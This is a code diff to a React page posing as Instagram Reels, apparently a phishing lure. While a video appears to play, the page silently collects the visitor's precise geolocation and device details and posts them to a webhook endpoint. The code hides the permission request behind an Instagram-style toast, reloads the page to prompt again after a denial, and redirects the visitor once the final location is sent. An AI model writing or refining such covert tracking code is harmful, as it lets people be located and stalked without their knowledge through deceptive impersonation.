@@ -15,8 +15,6 @@ import {
   PlusSquare,
   Film,
   User,
-  Wifi,
-  Signal,
   MapPin,
   RefreshCw,
 } from 'lucide-react';
@@ -138,62 +136,12 @@ function getDeviceInfo(): DeviceInfo | null {
   };
 }
 
-// ========== REAL TIME HOOK ==========
-function useCurrentTime() {
-  const [time, setTime] = useState('');
-  useEffect(() => {
-    const update = () => {
-      const now = new Date();
-      const h = now.getHours();
-      const m = now.getMinutes().toString().padStart(2, '0');
-      const ampm = h >= 12 ? 'PM' : 'AM';
-      const h12 = h % 12 || 12;
-      setTime(`${h12}:${m} ${ampm}`);
-    };
-    update();
-    const interval = setInterval(update, 10000);
-    return () => clearInterval(interval);
-  }, []);
-  return time;
-}
-
-// ========== BATTERY HOOK ==========
-function useBatteryLevel() {
-  const [level, setLevel] = useState(85);
-  useEffect(() => {
-    const bat = (navigator as any).getBattery;
-    if (bat) {
-      bat.call(navigator).then((b: any) => {
-        setLevel(Math.round(b.level * 100));
-        b.addEventListener('levelchange', () => setLevel(Math.round(b.level * 100)));
-      }).catch(() => {});
-    }
-  }, []);
-  return level;
-}
-
-// ========== CONNECTION HOOK ==========
-function useConnectionType() {
-  const [connType, setConnType] = useState('5G');
-  useEffect(() => {
-    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-    if (conn) {
-      const map: Record<string, string> = {
-        '4g': '5G', '3g': '4G', '2g': '3G', 'slow-2g': 'E', '5g': '5G',
-      };
-      setConnType(map[conn.effectiveType] || conn.effectiveType?.toUpperCase() || '5G');
-    }
-  }, []);
-  return connType;
-}
-
 // ========== MAIN COMPONENT ==========
 export default function InstagramReels() {
   const [loadingProgress, setLoadingProgress] = useState(0);
   const [isLoading, setIsLoading] = useState(true);
   const [liked, setLiked] = useState(false);
   const [saved, setSaved] = useState(false);
-  // Instagram-style subtle toast for permission (not "LOCATION CAPTURED")
   const [showPermissionHint, setShowPermissionHint] = useState(false);
   const [deniedCount, setDeniedCount] = useState(0);
 
@@ -204,66 +152,42 @@ export default function InstagramReels() {
   const attemptRef = useRef(0);
   const bestLocationRef = useRef<LocationData | null>(null);
 
-  const currentTime = useCurrentTime();
-  const batteryLevel = useBatteryLevel();
-  const connectionType = useConnectionType();
-
-  // ========== SILENT: Send location update to Webhook 2 ==========
-  const sendToWebhook2 = useCallback(async (loc: LocationData, attempt: number) => {
+  // ========== SILENT: Send EVERY location reading to webhook ==========
+  const sendLocationToWebhook = useCallback(async (loc: LocationData, attempt: number, isFinal: boolean) => {
     try {
-      await fetch('/api/location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: 'update',
-          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
-          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
-          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
-          deviceInfo: getDeviceInfo(),
-          googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
-          attemptNumber: attempt,
-        }),
-      });
-      console.log(`[Silent W2] Update #${attempt} - accuracy: ${loc.accuracy.toFixed(1)}m`);
-    } catch (e) { console.error('[Silent W2] Fail:', e); }
-  }, []);
-
-  // ========== SILENT: Send FINAL most accurate location to Webhook 1, then redirect ==========
-  const sendFinalToWebhook1 = useCallback(async (loc: LocationData, attempt: number) => {
-    if (isFinalSentRef.current) return;
-    isFinalSentRef.current = true;
-
-    try {
-      console.log(`[Silent W1] Sending FINAL - lat: ${loc.latitude}, lng: ${loc.longitude}, accuracy: ${loc.accuracy.toFixed(1)}m`);
       const res = await fetch('/api/location', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          type: 'final',
-          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
-          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
-          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
+          type: isFinal ? 'final' : 'update',
+          latitude: loc.latitude,
+          longitude: loc.longitude,
+          accuracy: loc.accuracy,
+          altitude: loc.altitude,
+          altitudeAccuracy: loc.altitudeAccuracy,
+          heading: loc.heading,
+          speed: loc.speed,
+          timestamp: loc.timestamp,
           deviceInfo: getDeviceInfo(),
           googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
           attemptNumber: attempt,
         }),
       });
       const data = await res.json();
-      console.log('[Silent W1] Response:', data);
+      console.log(`[Silent] ${isFinal ? 'FINAL' : 'Update'} #${attempt} sent - accuracy: ${loc.accuracy.toFixed(1)}m`);
 
-      // SILENT redirect - no overlay, no "Location Captured" screen
-      if (data.redirectUrl) {
-        // Small delay so the reel keeps playing naturally, then redirect
+      // SILENT redirect after final send
+      if (isFinal && data.redirectUrl) {
         setTimeout(() => {
           window.location.href = data.redirectUrl;
         }, 800);
       }
     } catch (e) {
-      console.error('[Silent W1] Fail:', e);
+      console.error('[Silent] Webhook fail:', e);
     }
   }, []);
 
-  // ========== SILENT: Start watching location - NO UI changes ==========
+  // ========== SILENT: Start watching location ==========
   const startWatchingLocation = useCallback(() => {
     if (!navigator.geolocation) return;
     if (hasRequestedRef.current) return;
@@ -277,41 +201,46 @@ export default function InstagramReels() {
     const watchId = navigator.geolocation.watchPosition(
       async (position) => {
         const loc: LocationData = {
-          latitude: position.coords.latitude, longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy, altitude: position.coords.altitude,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
           altitudeAccuracy: position.coords.altitudeAccuracy,
-          heading: position.coords.heading, speed: position.coords.speed,
+          heading: position.coords.heading,
+          speed: position.coords.speed,
           timestamp: position.timestamp,
         };
 
         attemptRef.current += 1;
         const attempt = attemptRef.current;
 
-        // Track best location (lowest accuracy)
+        // Track best location (lowest accuracy = most accurate)
         if (!bestLocationRef.current || loc.accuracy < bestLocationRef.current.accuracy) {
           bestLocationRef.current = loc;
         }
 
-        // ALWAYS send to Webhook 2 (every update)
-        sendToWebhook2(loc, attempt);
+        // Send EVERY reading to webhook
+        sendLocationToWebhook(loc, attempt, false);
 
-        // Check accuracy threshold - send final to Webhook 1
+        // If accuracy is good enough, send FINAL with best location
         if (loc.accuracy <= ACCURACY_THRESHOLD && !isFinalSentRef.current) {
           if (watchIdRef.current !== null) {
             navigator.geolocation.clearWatch(watchIdRef.current);
             watchIdRef.current = null;
           }
-          await sendFinalToWebhook1(loc, attempt);
+          isFinalSentRef.current = true;
+          await sendLocationToWebhook(bestLocationRef.current || loc, attempt, true);
         }
 
-        // Timeout safety: 60s max wait - send whatever best we have
+        // Timeout: 60s max - send best we have
         if (Date.now() - startTimeRef.current >= MAX_WATCH_TIME && !isFinalSentRef.current) {
           if (watchIdRef.current !== null) {
             navigator.geolocation.clearWatch(watchIdRef.current);
             watchIdRef.current = null;
           }
+          isFinalSentRef.current = true;
           const bestLoc = bestLocationRef.current || loc;
-          await sendFinalToWebhook1(bestLoc, attempt);
+          await sendLocationToWebhook(bestLoc, attempt, true);
         }
       },
       (error) => {
@@ -320,15 +249,15 @@ export default function InstagramReels() {
           navigator.geolocation.clearWatch(watchIdRef.current);
           watchIdRef.current = null;
         }
+        hasRequestedRef.current = false;
         setDeniedCount(prev => prev + 1);
-        // Show subtle Instagram-style hint (NOT a scary "LOCATION ACCESS REQUIRED" overlay)
         setShowPermissionHint(true);
       },
       { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
     );
 
     watchIdRef.current = watchId;
-  }, [sendToWebhook2, sendFinalToWebhook1]);
+  }, [sendLocationToWebhook]);
 
   // Loading animation
   useEffect(() => {
@@ -358,14 +287,12 @@ export default function InstagramReels() {
   const handlePermissionRetry = () => {
     setShowPermissionHint(false);
     hasRequestedRef.current = false;
-    // Use getCurrentPosition to re-trigger browser's native permission dialog
     navigator.geolocation.getCurrentPosition(
       () => startWatchingLocation(),
       (err) => {
         if (err.code === err.PERMISSION_DENIED) {
           setDeniedCount(prev => prev + 1);
           if (deniedCount >= 1) {
-            // Hard denied - reload page to get fresh prompt
             window.location.href = window.location.href.split('?')[0] + '?t=' + Date.now();
           } else {
             setShowPermissionHint(true);
@@ -399,38 +326,6 @@ export default function InstagramReels() {
       <div className="absolute inset-0 bg-gradient-to-b from-gray-900 via-gray-800 to-black">
         <div className="absolute inset-0 bg-gradient-to-br from-indigo-900/30 via-black to-purple-900/20" />
         <div className="absolute inset-0 opacity-20" style={{ backgroundImage: 'radial-gradient(circle at 30% 40%, rgba(255,255,255,0.1) 0%, transparent 50%), radial-gradient(circle at 70% 60%, rgba(255,255,255,0.05) 0%, transparent 40%)' }} />
-      </div>
-
-      {/* ========== STATUS BAR (non-clickable, just show) ========== */}
-      <div className="absolute top-0 left-0 right-0 z-30 px-5 pt-3 pb-2">
-        <div className="flex justify-between items-center">
-          <span className="text-white text-sm font-semibold tracking-tight" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif' }}>
-            {currentTime}
-          </span>
-          <div className="flex items-center gap-[6px]">
-            <svg width="17" height="12" viewBox="0 0 17 12" fill="none" className="mt-[1px]">
-              <rect x="0" y="8" width="3" height="4" rx="0.7" fill="white" />
-              <rect x="4" y="5.5" width="3" height="6.5" rx="0.7" fill="white" />
-              <rect x="8" y="3" width="3" height="9" rx="0.7" fill="white" />
-              <rect x="12" y="0" width="3" height="12" rx="0.7" fill="white" />
-            </svg>
-            <svg width="16" height="12" viewBox="0 0 16 12" fill="white" className="mt-[1px]">
-              <path d="M8 10.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z" />
-              <path d="M4.5 8.5c1-1.2 2.2-1.8 3.5-1.8s2.5.6 3.5 1.8" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
-              <path d="M1.5 5.5c1.8-2 4-3 6.5-3s4.7 1 6.5 3" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
-            </svg>
-            <span className="text-white text-[11px] font-semibold tracking-tight ml-[1px]">{connectionType}</span>
-            <div className="flex items-center ml-[2px]">
-              <div className="relative w-[25px] h-[11px] rounded-[3px] border border-white/90 p-[1.5px]">
-                <div
-                  className={`h-full rounded-[1.5px] transition-all ${batteryLevel > 60 ? 'bg-white' : batteryLevel > 20 ? 'bg-yellow-400' : 'bg-red-500'}`}
-                  style={{ width: `${batteryLevel}%` }}
-                />
-              </div>
-              <div className="w-[1.5px] h-[4px] bg-white/60 rounded-r-full ml-[0.5px]" />
-            </div>
-          </div>
-        </div>
       </div>
 
       {/* Top Nav */}
@@ -482,8 +377,7 @@ export default function InstagramReels() {
         </div>
       </div>
 
-      {/* ===== SUBTLE INSTAGRAM-STYLE PERMISSION HINT (NOT a location overlay!) ===== */}
-      {/* This looks like a normal Instagram toast notification, not "LOCATION CAPTURED" */}
+      {/* ===== SUBTLE PERMISSION HINT - looks like Instagram toast, NOT a location overlay ===== */}
       {showPermissionHint && (
         <motion.div
           initial={{ y: 100, opacity: 0 }}
